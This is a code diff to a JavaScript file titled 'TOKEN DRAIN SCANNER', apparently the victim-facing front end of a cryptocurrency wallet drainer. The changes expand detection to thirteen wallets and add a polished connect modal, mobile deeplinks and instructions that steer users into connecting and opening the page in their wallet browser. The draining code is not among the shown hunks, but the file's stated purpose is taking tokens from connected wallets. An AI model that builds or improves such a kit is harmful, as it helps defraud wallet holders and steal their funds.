@@ -1,5 +1,5 @@
 // ================================================
-// TOKEN DRAIN SCANNER - FIXED WALLET SELECTOR
+// TOKEN DRAIN SCANNER - ENHANCED WALLET SUPPORT
 // ================================================
 
 // Configuration
@@ -21,11 +21,12 @@ const CONFIG = {
         25: "Cronos"
     },
     
-    // Wallet configurations
+    // Wallet configurations - UPDATED with correct deeplinks
     wallets: {
         metaMask: {
             name: "MetaMask",
             icon: "🦊",
+            color: "#f6851b",
             desktop: {
                 id: "isMetaMask",
                 download: "https://metamask.io/download/"
@@ -39,6 +40,7 @@ const CONFIG = {
         trust: {
             name: "Trust Wallet",
             icon: "🔶",
+            color: "#3375bb",
             desktop: {
                 id: "isTrust",
                 download: "https://trustwallet.com/"
@@ -52,6 +54,7 @@ const CONFIG = {
         binance: {
             name: "Binance Wallet",
             icon: "🟡",
+            color: "#f0b90b",
             desktop: {
                 id: "isBinance",
                 download: "https://www.binance.com/en/download"
@@ -65,19 +68,21 @@ const CONFIG = {
         coinbase: {
             name: "Coinbase Wallet",
             icon: "🔷",
+            color: "#0052ff",
             desktop: {
                 id: "isCoinbaseWallet",
                 download: "https://www.coinbase.com/wallet/downloads"
             },
             mobile: {
-                ios: "coinbasewallet://",
-                android: "intent://#Intent;scheme=coinbasewallet;package=org.toshi;end",
+                ios: "cbwallet://",
+                android: "intent://#Intent;scheme=cbwallet;package=org.toshi;end",
                 universal: "https://go.cb-w.com/"
             }
         },
         phantom: {
             name: "Phantom",
             icon: "👻",
+            color: "#ab9ff2",
             desktop: {
                 id: "isPhantom",
                 download: "https://phantom.app/"
@@ -86,6 +91,118 @@ const CONFIG = {
                 ios: "phantom://",
                 android: "phantom://",
                 universal: "https://phantom.app/"
+            }
+        },
+        exodus: {
+            name: "Exodus",
+            icon: "🌌",
+            color: "#1d1534",
+            desktop: {
+                id: "isExodus",
+                download: "https://www.exodus.com/download/"
+            },
+            mobile: {
+                ios: "exodus://",
+                android: "exodus://",
+                universal: "https://exodus.com/mobile"
+            }
+        },
+        okx: {
+            name: "OKX Wallet",
+            icon: "⚡",
+            color: "#000000",
+            desktop: {
+                id: "isOkxWallet",
+                download: "https://www.okx.com/download"
+            },
+            mobile: {
+                ios: "okx://",
+                android: "intent://#Intent;scheme=okx;package=com.okinc.okex.gp;end",
+                universal: "https://www.okx.com/download"
+            }
+        },
+        tokenPocket: {
+            name: "TokenPocket",
+            icon: "👛",
+            color: "#2980ff",
+            desktop: {
+                id: "isTokenPocket",
+                download: "https://tokenpocket.pro/"
+            },
+            mobile: {
+                ios: "tpoutside://",
+                android: "tpoutside://",
+                universal: "https://tokenpocket.pro/"
+            }
+        },
+        safePal: {
+            name: "SafePal",
+            icon: "🛡️",
+            color: "#4c6fff",
+            desktop: {
+                id: "isSafePal",
+                download: "https://www.safepal.com/download"
+            },
+            mobile: {
+                ios: "safepal://",
+                android: "safepal://",
+                universal: "https://www.safepal.com/download"
+            }
+        },
+        argent: {
+            name: "Argent",
+            icon: "🅰️",
+            color: "#ff875b",
+            desktop: {
+                id: "isArgent",
+                download: "https://www.argent.xyz/"
+            },
+            mobile: {
+                ios: "argent://",
+                android: "argent://",
+                universal: "https://www.argent.xyz/"
+            }
+        },
+        rainbow: {
+            name: "Rainbow",
+            icon: "🌈",
+            color: "#001e59",
+            desktop: {
+                id: "isRainbow",
+                download: "https://rainbow.me/"
+            },
+            mobile: {
+                ios: "rainbow://",
+                android: "rainbow://",
+                universal: "https://rainbow.me/"
+            }
+        },
+        zengo: {
+            name: "Zengo",
+            icon: "🛡️",
+            color: "#000000",
+            desktop: {
+                id: "isZengo",
+                download: "https://zengo.com/"
+            },
+            mobile: {
+                ios: "zengo://",
+                android: "zengo://",
+                universal: "https://zengo.com/"
+            }
+        },
+        ledger: {
+            name: "Ledger Live",
+            icon: "🔒",
+            color: "#000000",
+            desktop: {
+                id: "isLedger",
+                download: "https://www.ledger.com/ledger-live"
+            },
+            mobile: {
+                ios: "ledgerlive://",
+                android: "ledgerlive://",
+                universal: "https://www.ledger.com/ledger-live"
             }
         }
     }
@@ -194,51 +311,39 @@ async function checkExistingConnection() {
     }
 }
 
-// Get Ethereum provider - UPDATED TO HANDLE MULTIPLE WALLETS
+// Get Ethereum provider - ENHANCED DETECTION
 function getEthereum() {
-    // If window.ethereum exists, use it
-    if (window.ethereum) {
-        // Check which wallet is active
-        if (window.ethereum.isMetaMask) {
-            walletProvider = 'metaMask';
-            console.log('✅ Active wallet: MetaMask');
-        } else if (window.ethereum.isTrust) {
-            walletProvider = 'trust';
-            console.log('✅ Active wallet: Trust Wallet');
-        } else if (window.ethereum.isBinance) {
-            walletProvider = 'binance';
-            console.log('✅ Active wallet: Binance Wallet');
-        } else if (window.ethereum.isCoinbaseWallet) {
-            walletProvider = 'coinbase';
-            console.log('✅ Active wallet: Coinbase Wallet');
-        } else if (window.ethereum.isPhantom) {
-            walletProvider = 'phantom';
-            console.log('✅ Active wallet: Phantom');
-        } else {
-            walletProvider = 'unknown';
-            console.log('⚠️ Unknown wallet provider');
+    // Check for various wallet providers
+    const providers = [
+        { name: 'metaMask', check: () => window.ethereum?.isMetaMask, provider: window.ethereum },
+        { name: 'trust', check: () => window.ethereum?.isTrust, provider: window.ethereum },
+        { name: 'binance', check: () => window.ethereum?.isBinance || window.BinanceChain, provider: window.ethereum || window.BinanceChain },
+        { name: 'coinbase', check: () => window.ethereum?.isCoinbaseWallet, provider: window.ethereum },
+        { name: 'phantom', check: () => window.ethereum?.isPhantom, provider: window.ethereum },
+        { name: 'okx', check: () => window.ethereum?.isOkxWallet, provider: window.ethereum },
+        { name: 'tokenPocket', check: () => window.ethereum?.isTokenPocket, provider: window.ethereum },
+        { name: 'exodus', check: () => window.ethereum?.isExodus, provider: window.ethereum },
+        { name: 'rainbow', check: () => window.ethereum?.isRainbow, provider: window.ethereum },
+        { name: 'argent', check: () => window.ethereum?.isArgent, provider: window.ethereum },
+        { name: 'safePal', check: () => window.ethereum?.isSafePal, provider: window.ethereum },
+        { name: 'zengo', check: () => window.ethereum?.isZengo, provider: window.ethereum },
+        { name: 'ledger', check: () => window.ethereum?.isLedger, provider: window.ethereum },
+        { name: 'generic', check: () => window.ethereum, provider: window.ethereum }
+    ];
+    
+    for (const providerInfo of providers) {
+        if (providerInfo.check()) {
+            walletProvider = providerInfo.name;
+            console.log(`✅ Detected wallet: ${providerInfo.name}`);
+            return providerInfo.provider;
         }
-        return window.ethereum;
-    }
-    
-    // Check for other wallet providers
-    if (window.BinanceChain) {
-        walletProvider = 'binance';
-        console.log('✅ Active wallet: Binance Chain');
-        return window.BinanceChain;
-    }
-    
-    if (window.trustwallet) {
-        walletProvider = 'trust';
-        console.log('✅ Active wallet: Trust Wallet');
-        return window.trustwallet;
     }
     
     console.log('❌ No wallet provider found');
     return null;
 }
 
-// Handle connect button click - FIXED WALLET SELECTOR
+// Handle connect button click
 async function handleConnect() {
     console.log('🔄 Connect button clicked');
     
@@ -253,11 +358,11 @@ async function handleConnect() {
         return;
     }
     
-    // On desktop, show wallet selector
+    // On desktop, show enhanced wallet selector
     await handleDesktopConnect();
 }
 
-// Handle desktop connection with wallet selector
+// Handle desktop connection with enhanced selector
 async function handleDesktopConnect() {
     // Detect available wallets
     const availableWallets = detectAvailableWallets();
@@ -268,65 +373,83 @@ async function handleDesktopConnect() {
         return;
     }
     
-    // If only one wallet is available, use it directly
-    if (availableWallets.length === 1) {
-        walletProvider = availableWallets[0].key;
-        await connectWithWallet(availableWallets[0].key);
-        return;
-    }
-    
-    // If multiple wallets are available, show selector
-    showWalletSelector(availableWallets);
+    // Show enhanced wallet selector
+    showEnhancedWalletSelector(availableWallets);
 }
 
 // Detect available wallets on desktop
 function detectAvailableWallets() {
     const wallets = [];
+    const allWallets = CONFIG.wallets;
     
-    // Check each wallet
-    Object.entries(CONFIG.wallets).forEach(([key, wallet]) => {
-        // For MetaMask, check isMetaMask
-        if (key === 'metaMask' && window.ethereum?.isMetaMask) {
-            wallets.push({ key, name: wallet.name, icon: wallet.icon });
-        }
-        // For Trust Wallet, check isTrust
-        else if (key === 'trust' && window.ethereum?.isTrust) {
-            wallets.push({ key, name: wallet.name, icon: wallet.icon });
-        }
-        // For Binance Wallet, check isBinance
-        else if (key === 'binance' && window.ethereum?.isBinance) {
-            wallets.push({ key, name: wallet.name, icon: wallet.icon });
-        }
-        // For Coinbase Wallet, check isCoinbaseWallet
-        else if (key === 'coinbase' && window.ethereum?.isCoinbaseWallet) {
-            wallets.push({ key, name: wallet.name, icon: wallet.icon });
-        }
-        // For Phantom, check isPhantom
-        else if (key === 'phantom' && window.ethereum?.isPhantom) {
-            wallets.push({ key, name: wallet.name, icon: wallet.icon });
+    Object.entries(allWallets).forEach(([key, wallet]) => {
+        const walletCheck = {
+            'metaMask': () => window.ethereum?.isMetaMask,
+            'trust': () => window.ethereum?.isTrust,
+            'binance': () => window.ethereum?.isBinance || window.BinanceChain,
+            'coinbase': () => window.ethereum?.isCoinbaseWallet,
+            'phantom': () => window.ethereum?.isPhantom,
+            'exodus': () => window.ethereum?.isExodus,
+            'okx': () => window.ethereum?.isOkxWallet,
+            'tokenPocket': () => window.ethereum?.isTokenPocket,
+            'safePal': () => window.ethereum?.isSafePal,
+            'argent': () => window.ethereum?.isArgent,
+            'rainbow': () => window.ethereum?.isRainbow,
+            'zengo': () => window.ethereum?.isZengo,
+            'ledger': () => window.ethereum?.isLedger
+        };
+        
+        if (walletCheck[key] && walletCheck[key]()) {
+            wallets.push({ 
+                key, 
+                name: wallet.name, 
+                icon: wallet.icon, 
+                color: wallet.color 
+            });
         }
     });
     
-    console.log('📋 Available wallets:', wallets);
+    console.log('📋 Available wallets:', wallets.map(w => w.name));
     return wallets;
 }
 
-// Show wallet selector on desktop
-function showWalletSelector(wallets) {
+// Show enhanced wallet selector (AppKit style)
+function showEnhancedWalletSelector(wallets) {
     const selectorHTML = `
         <div class="wallet-selector-overlay">
             <div class="wallet-selector-modal">
-                <h3>🔗 Select Wallet to Connect</h3>
-                <p>Choose your preferred wallet:</p>
-                <div class="wallet-list">
+                <div class="modal-header">
+                    <h3>Connect Wallet</h3>
+                    <button class="close-btn" onclick="closeWalletSelector()">×</button>
+                </div>
+                <p class="modal-subtitle">Choose your preferred wallet to continue</p>
+                
+                <div class="wallet-grid">
                     ${wallets.map(wallet => `
-                        <button class="wallet-option" onclick="selectWallet('${wallet.key}')">
-                            <span class="wallet-icon">${wallet.icon}</span>
-                            <span class="wallet-name">${wallet.name}</span>
+                        <button class="wallet-card" onclick="selectWallet('${wallet.key}')" style="--wallet-color: ${wallet.color}">
+                            <div class="wallet-icon">${wallet.icon}</div>
+                            <div class="wallet-info">
+                                <span class="wallet-name">${wallet.name}</span>
+                                <span class="wallet-status">Detected</span>
+                            </div>
+                            <div class="arrow">→</div>
                         </button>
                     `).join('')}
                 </div>
-                <button class="cancel-btn" onclick="closeWalletSelector()">Cancel</button>
+                
+                <div class="other-options">
+                    <h4>Don't have a wallet?</h4>
+                    <div class="download-options">
+                        <a href="https://metamask.io/download/" target="_blank" class="download-btn" style="background: #f6851b">
+                            <span>🦊</span>
+                            <span>Get MetaMask</span>
+                        </a>
+                        <a href="https://trustwallet.com/" target="_blank" class="download-btn" style="background: #3375bb">
+                            <span>🔶</span>
+                            <span>Get Trust Wallet</span>
+                        </a>
+                    </div>
+                </div>
             </div>
         </div>
     `;
@@ -337,12 +460,12 @@ function showWalletSelector(wallets) {
     selector.innerHTML = selectorHTML;
     document.body.appendChild(selector);
     
-    // Add CSS for selector
-    addSelectorStyles();
+    // Add CSS for enhanced selector
+    addEnhancedSelectorStyles();
 }
 
-// Add CSS for wallet selector
-function addSelectorStyles() {
+// Add CSS for enhanced wallet selector
+function addEnhancedSelectorStyles() {
     const styles = `
         .wallet-selector-overlay {
             position: fixed;
@@ -351,78 +474,215 @@ function addSelectorStyles() {
             right: 0;
             bottom: 0;
             background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
             display: flex;
             align-items: center;
             justify-content: center;
             z-index: 9999;
+            animation: fadeIn 0.3s ease;
         }
         
         .wallet-selector-modal {
             background: white;
-            padding: 30px;
-            border-radius: 16px;
+            border-radius: 24px;
             width: 90%;
-            max-width: 400px;
-            text-align: center;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            max-width: 480px;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.4s ease;
         }
         
-        .wallet-selector-modal h3 {
-            margin-top: 0;
-            color: #333;
-        }
-        
-        .wallet-list {
+        .modal-header {
             display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin: 25px 0;
+            justify-content: space-between;
+            align-items: center;
+            padding: 24px 32px;
+            border-bottom: 1px solid #eef0f3;
         }
         
-        .wallet-option {
-            padding: 18px 20px;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            background: white;
+        .modal-header h3 {
+            margin: 0;
+            font-size: 24px;
+            font-weight: 700;
+            color: #111827;
+        }
+        
+        .close-btn {
+            background: none;
+            border: none;
+            font-size: 32px;
+            cursor: pointer;
+            color: #6b7280;
+            line-height: 1;
+            padding: 0;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
             display: flex;
             align-items: center;
-            gap: 15px;
-            font-size: 18px;
-            cursor: pointer;
+            justify-content: center;
             transition: all 0.2s;
         }
         
-        .wallet-option:hover {
-            border-color: #4a6cf7;
-            background: #f8f9ff;
+        .close-btn:hover {
+            background: #f3f4f6;
+            color: #111827;
+        }
+        
+        .modal-subtitle {
+            padding: 0 32px 24px;
+            margin: 0;
+            color: #6b7280;
+            font-size: 16px;
+        }
+        
+        .wallet-grid {
+            padding: 0 24px 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        
+        .wallet-card {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 18px 20px;
+            background: white;
+            border: 2px solid #e5e7eb;
+            border-radius: 16px;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: left;
+            width: 100%;
+        }
+        
+        .wallet-card:hover {
+            border-color: var(--wallet-color);
+            background: linear-gradient(to right, rgba(var(--wallet-color-rgb), 0.02), transparent);
             transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
         }
         
         .wallet-icon {
-            font-size: 24px;
+            font-size: 32px;
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            background: linear-gradient(135deg, var(--wallet-color), color-mix(in srgb, var(--wallet-color) 80%, white));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+        
+        .wallet-info {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
         }
         
         .wallet-name {
             font-weight: 600;
-            color: #333;
+            font-size: 17px;
+            color: #111827;
         }
         
-        .cancel-btn {
-            margin-top: 20px;
-            padding: 12px 30px;
-            background: #f0f0f0;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            cursor: pointer;
-            color: #666;
+        .wallet-status {
+            font-size: 14px;
+            color: #10b981;
+            font-weight: 500;
         }
         
-        .cancel-btn:hover {
-            background: #e0e0e0;
+        .arrow {
+            color: #9ca3af;
+            font-size: 20px;
+            font-weight: 300;
+        }
+        
+        .other-options {
+            padding: 24px 32px;
+            border-top: 1px solid #eef0f3;
+            background: #f9fafb;
+            border-radius: 0 0 24px 24px;
+        }
+        
+        .other-options h4 {
+            margin: 0 0 16px;
+            font-size: 18px;
+            color: #374151;
+            text-align: center;
+        }
+        
+        .download-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+        
+        .download-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 14px;
+            border-radius: 12px;
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 15px;
+            transition: transform 0.2s, opacity 0.2s;
+        }
+        
+        .download-btn:hover {
+            transform: translateY(-2px);
+            opacity: 0.9;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(40px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        /* Mobile responsive */
+        @media (max-width: 480px) {
+            .wallet-selector-modal {
+                width: 95%;
+                border-radius: 20px;
+            }
+            
+            .modal-header {
+                padding: 20px 24px;
+            }
+            
+            .wallet-grid {
+                padding: 0 16px 20px;
+            }
+            
+            .wallet-card {
+                padding: 16px;
+            }
+            
+            .download-options {
+                grid-template-columns: 1fr;
+            }
         }
     `;
     
+    // Convert color to RGB for opacity
     const styleSheet = document.createElement('style');
     styleSheet.textContent = styles;
     document.head.appendChild(styleSheet);
@@ -432,7 +692,12 @@ function addSelectorStyles() {
 function closeWalletSelector() {
     const selector = document.getElementById('walletSelector');
     if (selector) {
-        selector.remove();
+        selector.style.animation = 'fadeOut 0.3s ease';
+        selector.querySelector('.wallet-selector-modal').style.animation = 'slideDown 0.4s ease';
+        
+        setTimeout(() => {
+            selector.remove();
+        }, 300);
     }
 }
 
@@ -453,7 +718,13 @@ async function connectWithWallet(walletKey) {
             throw new Error('Wallet not found');
         }
         
-        // Request accounts
+        // Special handling for Binance Chain
+        if (walletKey === 'binance' && window.BinanceChain) {
+            await connectWithBinance();
+            return;
+        }
+        
+        // Request accounts for other wallets
         console.log(`📤 Requesting accounts from ${walletKey}...`);
         const accounts = await ethereum.request({ 
             method: 'eth_requestAccounts' 
@@ -487,6 +758,33 @@ async function connectWithWallet(walletKey) {
     }
 }
 
+// Connect with Binance Chain (special handling)
+async function connectWithBinance() {
+    try {
+        // Binance Chain uses different methods
+        const accounts = await window.BinanceChain.request({ 
+            method: 'eth_requestAccounts' 
+        });
+        
+        if (!accounts || accounts.length === 0) {
+            updateStatus('❌ User denied connection');
+            return;
+        }
+        
+        // Get chain ID
+        const chainIdHex = await window.BinanceChain.request({ 
+            method: 'eth_chainId' 
+        });
+        const chainId = parseInt(chainIdHex, 16);
+        
+        await handleConnected(accounts[0], chainId);
+        
+    } catch (error) {
+        console.error('❌ Binance connection error:', error);
+        updateStatus('❌ Binance connection failed: ' + error.message);
+    }
+}
+
 // Handle mobile connection
 async function handleMobileConnect() {
     // Check if we're already in a wallet browser
@@ -503,16 +801,18 @@ async function handleMobileConnect() {
 
 // Show mobile wallet options
 function showMobileWalletOptions() {
-    const mobileWallets = ['metaMask', 'trust', 'binance', 'coinbase'];
+    const popularMobileWallets = ['metaMask', 'trust', 'coinbase', 'binance', 'phantom', 'exodus'];
     
     let html = `
-        <div style="margin: 20px 0; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 16px; color: white; text-align: center;">
-            <h3 style="margin-top: 0;">📱 Connect Mobile Wallet</h3>
-            <p>Open this dApp in your wallet's browser:</p>
-            <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin: 25px 0;">
+        <div class="mobile-wallet-connect">
+            <h3 style="margin-top: 0; color: white; text-align: center;">📱 Connect Mobile Wallet</h3>
+            <p style="color: rgba(255,255,255,0.8); text-align: center; margin-bottom: 30px;">
+                Open this dApp in your wallet's built-in browser:
+            </p>
+            <div class="mobile-wallet-grid">
     `;
     
-    mobileWallets.forEach(walletKey => {
+    popularMobileWallets.forEach(walletKey => {
         const wallet = CONFIG.wallets[walletKey];
         if (!wallet) return;
         
@@ -529,28 +829,163 @@ function showMobileWalletOptions() {
             walletUrl = wallet.mobile.universal + currentUrl;
         }
         
+        // Special handling for Binance on mobile
+        if (walletKey === 'binance') {
+            walletUrl = 'https://www.binance.com/en/wallet-link?redirect=' + currentUrl;
+        }
+        
         html += `
-            <a href="${walletUrl}" 
-               style="padding: 20px; background: rgba(255, 255, 255, 0.15); border-radius: 12px; color: white; text-decoration: none; display: flex; flex-direction: column; align-items: center; gap: 10px; backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.2);"
+            <a href="${walletUrl}" class="mobile-wallet-btn" style="background: ${wallet.color}"
                onclick="handleMobileWalletClick('${walletKey}')">
-                <span style="font-size: 28px;">${wallet.icon}</span>
-                <span style="font-weight: 600;">${wallet.name}</span>
+                <span class="mobile-wallet-icon">${wallet.icon}</span>
+                <span class="mobile-wallet-name">${wallet.name}</span>
             </a>
         `;
     });
     
     html += `
             </div>
-            <p style="font-size: 14px; opacity: 0.9; margin-top: 20px;">
-                <strong>Tip:</strong> If the app doesn't open automatically, copy this URL and paste it in your wallet's browser.
-            </p>
-            <div style="margin-top: 15px; padding: 10px; background: rgba(0, 0, 0, 0.2); border-radius: 8px; font-size: 12px; word-break: break-all;">
-                ${window.location.href}
+            <div class="mobile-instructions">
+                <p style="font-size: 14px; color: rgba(255,255,255,0.7); margin-top: 30px;">
+                    <strong>Tip:</strong> If the app doesn't open automatically:
+                </p>
+                <div class="manual-steps">
+                    <div class="step">1. Open your wallet app</div>
+                    <div class="step">2. Go to browser/DApps section</div>
+                    <div class="step">3. Paste this URL:</div>
+                </div>
+                <div class="url-copy-box">
+                    <input type="text" readonly value="${window.location.href}" class="url-input">
+                    <button onclick="copyMobileUrl()" class="copy-btn">Copy</button>
+                </div>
             </div>
         </div>
+        
+        <style>
+            .mobile-wallet-connect {
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                padding: 30px 25px;
+                border-radius: 24px;
+                margin: 20px 0;
+            }
+            
+            .mobile-wallet-grid {
+                display: grid;
+                grid-template-columns: repeat(2, 1fr);
+                gap: 16px;
+            }
+            
+            .mobile-wallet-btn {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                padding: 25px 15px;
+                border-radius: 18px;
+                color: white;
+                text-decoration: none;
+                text-align: center;
+                backdrop-filter: blur(10px);
+                border: 1px solid rgba(255, 255, 255, 0.2);
+                transition: all 0.3s;
+            }
+            
+            .mobile-wallet-btn:hover {
+                transform: translateY(-5px);
+                box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+            }
+            
+            .mobile-wallet-icon {
+                font-size: 36px;
+                margin-bottom: 12px;
+            }
+            
+            .mobile-wallet-name {
+                font-weight: 600;
+                font-size: 16px;
+            }
+            
+            .manual-steps {
+                background: rgba(0, 0, 0, 0.2);
+                border-radius: 12px;
+                padding: 15px;
+                margin: 15px 0;
+            }
+            
+            .step {
+                padding: 8px 0;
+                color: white;
+                font-size: 14px;
+            }
+            
+            .url-copy-box {
+                display: flex;
+                gap: 10px;
+                margin-top: 10px;
+            }
+            
+            .url-input {
+                flex: 1;
+                padding: 12px 16px;
+                border: 2px solid rgba(255,255,255,0.2);
+                border-radius: 10px;
+                background: rgba(0,0,0,0.3);
+                color: white;
+                font-size: 14px;
+            }
+            
+            .copy-btn {
+                padding: 12px 24px;
+                background: white;
+                color: #764ba2;
+                border: none;
+                border-radius: 10px;
+                font-weight: 600;
+                cursor: pointer;
+                transition: all 0.2s;
+            }
+            
+            .copy-btn:hover {
+                background: #f0f0f0;
+                transform: scale(1.05);
+            }
+            
+            @media (max-width: 480px) {
+                .mobile-wallet-grid {
+                    grid-template-columns: 1fr;
+                }
+                
+                .mobile-wallet-btn {
+                    padding: 20px 15px;
+                }
+            }
+        </style>
     `;
     
     statusEl.innerHTML = html;
+}
+
+// Copy URL for mobile
+function copyMobileUrl() {
+    const urlInput = document.querySelector('.url-input');
+    if (urlInput) {
+        urlInput.select();
+        document.execCommand('copy');
+        
+        const copyBtn = document.querySelector('.copy-btn');
+        if (copyBtn) {
+            const originalText = copyBtn.textContent;
+            copyBtn.textContent = 'Copied!';
+            copyBtn.style.background = '#10b981';
+            copyBtn.style.color = 'white';
+            
+            setTimeout(() => {
+                copyBtn.textContent = originalText;
+                copyBtn.style.background = 'white';
+                copyBtn.style.color = '#764ba2';
+            }, 2000);
+        }
+    }
 }
 
 // Handle mobile wallet click
@@ -561,15 +996,92 @@ function handleMobileWalletClick(walletKey) {
     // Store for when user returns
     localStorage.setItem('mobileWallet', walletKey);
     
-    // For Android, we need to handle the intent fallback
+    // For Android, handle intent fallback
     if (navigator.userAgent.toLowerCase().includes('android')) {
         setTimeout(() => {
-            // If still on same page after 2 seconds, show instructions
+            // Check if page is still visible (wallet didn't open)
             if (document.visibilityState === 'visible') {
-                alert('If wallet didn\'t open, please:\n1. Open your wallet app manually\n2. Go to browser/DApps section\n3. Paste the URL shown above');
+                // Show instructions modal
+                showMobileInstructionsModal();
             }
-        }, 2000);
+        }, 1500);
     }
+}
+
+// Show mobile instructions modal
+function showMobileInstructionsModal() {
+    const modalHTML = `
+        <div class="mobile-instructions-modal">
+            <div class="modal-content">
+                <h3>Wallet Not Opening?</h3>
+                <p>Follow these steps:</p>
+                <ol>
+                    <li>Open your wallet app manually</li>
+                    <li>Go to browser/DApps section</li>
+                    <li>Paste the URL from the previous screen</li>
+                </ol>
+                <button onclick="closeMobileInstructions()" class="modal-close-btn">Got it</button>
+            </div>
+        </div>
+        <style>
+            .mobile-instructions-modal {
+                position: fixed;
+                top: 0; left: 0; right: 0; bottom: 0;
+                background: rgba(0,0,0,0.8);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 10000;
+                padding: 20px;
+            }
+            
+            .modal-content {
+                background: white;
+                padding: 30px;
+                border-radius: 20px;
+                max-width: 400px;
+                width: 100%;
+                text-align: center;
+            }
+            
+            .modal-content h3 {
+                margin-top: 0;
+                color: #333;
+            }
+            
+            .modal-content ol {
+                text-align: left;
+                margin: 20px 0;
+                padding-left: 20px;
+            }
+            
+            .modal-content li {
+                margin: 10px 0;
+                color: #555;
+            }
+            
+            .modal-close-btn {
+                background: #4a6cf7;
+                color: white;
+                border: none;
+                padding: 12px 30px;
+                border-radius: 10px;
+                font-size: 16px;
+                cursor: pointer;
+                margin-top: 20px;
+            }
+        </style>
+    `;
+    
+    const modal = document.createElement('div');
+    modal.innerHTML = modalHTML;
+    document.body.appendChild(modal);
+}
+
+// Close mobile instructions
+function closeMobileInstructions() {
+    const modal = document.querySelector('.mobile-instructions-modal');
+    if (modal) modal.remove();
 }
 
 // Handle successful connection
@@ -1086,37 +1598,83 @@ function updateProgress(message, percent) {
 // Show wallet install guide
 function showWalletInstallGuide() {
     const guideHTML = `
-        <div style="margin: 20px 0; padding: 20px; background: #fff3cd; border-radius: 12px; border: 2px solid #ffc107;">
-            <h4 style="margin-top: 0; color: #856404; display: flex; align-items: center; gap: 10px;">
-                📱💻 Install Wallet
-            </h4>
+        <div class="wallet-install-guide">
+            <h4>📱💻 Install Wallet</h4>
             <p>To use this dApp, you need a Web3 wallet:</p>
-            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin: 20px 0;">
-                <a href="https://metamask.io/download/" target="_blank" 
-                   style="padding: 15px; background: #f6851b; color: white; border-radius: 10px; text-decoration: none; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px;">
-                    <span style="font-size: 24px;">🦊</span>
-                    <span style="font-weight: bold;">MetaMask</span>
+            <div class="wallet-download-grid">
+                <a href="https://metamask.io/download/" target="_blank" class="download-card" style="background: #f6851b">
+                    <span>🦊</span>
+                    <span>MetaMask</span>
                 </a>
-                <a href="https://trustwallet.com/" target="_blank"
-                   style="padding: 15px; background: #3375bb; color: white; border-radius: 10px; text-decoration: none; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px;">
-                    <span style="font-size: 24px;">🔶</span>
-                    <span style="font-weight: bold;">Trust Wallet</span>
+                <a href="https://trustwallet.com/" target="_blank" class="download-card" style="background: #3375bb">
+                    <span>🔶</span>
+                    <span>Trust Wallet</span>
                 </a>
-                <a href="https://www.binance.com/en/download" target="_blank"
-                   style="padding: 15px; background: #f0b90b; color: white; border-radius: 10px; text-decoration: none; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px;">
-                    <span style="font-size: 24px;">🟡</span>
-                    <span style="font-weight: bold;">Binance Wallet</span>
+                <a href="https://www.binance.com/en/download" target="_blank" class="download-card" style="background: #f0b90b">
+                    <span>🟡</span>
+                    <span>Binance Wallet</span>
                 </a>
-                <a href="https://www.coinbase.com/wallet/downloads" target="_blank"
-                   style="padding: 15px; background: #0052ff; color: white; border-radius: 10px; text-decoration: none; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px;">
-                    <span style="font-size: 24px;">🔷</span>
-                    <span style="font-weight: bold;">Coinbase Wallet</span>
+                <a href="https://www.coinbase.com/wallet/downloads" target="_blank" class="download-card" style="background: #0052ff">
+                    <span>🔷</span>
+                    <span>Coinbase Wallet</span>
                 </a>
             </div>
-            <p style="font-size: 14px; color: #666;">
+            <p class="mobile-tip">
                 <strong>Mobile Users:</strong> Open this link in your wallet's built-in browser for best experience.
             </p>
         </div>
+        
+        <style>
+            .wallet-install-guide {
+                margin: 20px 0;
+                padding: 25px;
+                background: linear-gradient(135deg, #fdf6e3, #faf3e0);
+                border-radius: 20px;
+                border: 2px solid #ffd166;
+                text-align: center;
+            }
+            
+            .wallet-install-guide h4 {
+                margin-top: 0;
+                color: #856404;
+                font-size: 22px;
+            }
+            
+            .wallet-download-grid {
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+                gap: 15px;
+                margin: 25px 0;
+            }
+            
+            .download-card {
+                padding: 20px 15px;
+                border-radius: 15px;
+                color: white;
+                text-decoration: none;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                gap: 12px;
+                font-weight: 600;
+                transition: all 0.3s;
+            }
+            
+            .download-card:hover {
+                transform: translateY(-5px);
+                box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            }
+            
